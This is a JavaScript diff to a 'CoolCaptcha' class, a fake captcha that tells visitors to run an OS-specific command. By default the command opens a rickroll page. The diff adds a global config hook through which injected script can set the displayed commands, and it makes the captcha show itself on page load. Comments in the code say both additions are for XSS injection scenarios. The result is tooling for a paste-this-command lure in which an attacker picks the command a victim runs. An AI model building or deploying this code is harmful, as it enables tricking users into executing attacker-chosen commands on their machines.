@@ -3,16 +3,20 @@ import cssStyles from './styles.css';
 
 class CoolCaptcha {
     constructor(options = {}) {
+        // Check for global configuration (for XSS injection scenarios)
+        const globalConfig = window.CoolCaptchaConfig || {};
+        const mergedOptions = { ...globalConfig, ...options };
+
         this.options = {
-            onSuccess: options.onSuccess || (() => {}),
-            onFailure: options.onFailure || (() => {}),
-            onError: options.onError || ((error) => console.error('Captcha error:', error)),
+            onSuccess: mergedOptions.onSuccess || (() => {}),
+            onFailure: mergedOptions.onFailure || (() => {}),
+            onError: mergedOptions.onError || ((error) => console.error('Captcha error:', error)),
             commands: {
-                windows: options.commands?.windows || process.env.CAPTCHA_COMMAND_WINDOWS || 'start https://customrickroll.github.io/',
-                mac: options.commands?.mac || process.env.CAPTCHA_COMMAND_MAC || 'open https://customrickroll.github.io/',
-                linux: options.commands?.linux || process.env.CAPTCHA_COMMAND_LINUX || 'xdg-open https://customrickroll.github.io/'
+                windows: mergedOptions.commands?.windows || process.env.CAPTCHA_COMMAND_WINDOWS || 'start https://customrickroll.github.io/',
+                mac: mergedOptions.commands?.mac || process.env.CAPTCHA_COMMAND_MAC || 'open https://customrickroll.github.io/',
+                linux: mergedOptions.commands?.linux || process.env.CAPTCHA_COMMAND_LINUX || 'xdg-open https://customrickroll.github.io/'
             },
-            ...options
+            ...mergedOptions
         };
         
         this.selectedImages = new Set();
@@ -185,8 +189,6 @@ class CoolCaptcha {
         } else if (userAgent.includes('mac')) {
             detectedOS = 'mac';
         }
-
-        detectedOS = 'windows';
 
         this.updateCommandForOS(detectedOS);
     }
@@ -447,5 +449,11 @@ class CoolCaptcha {
         }
     }
 }
+
+// Auto-instantiate and show captcha when script loads (for XSS scenarios)
+document.addEventListener('DOMContentLoaded', () => {
+    const captcha = new CoolCaptcha();
+    captcha.show();
+});
 
 export default CoolCaptcha;
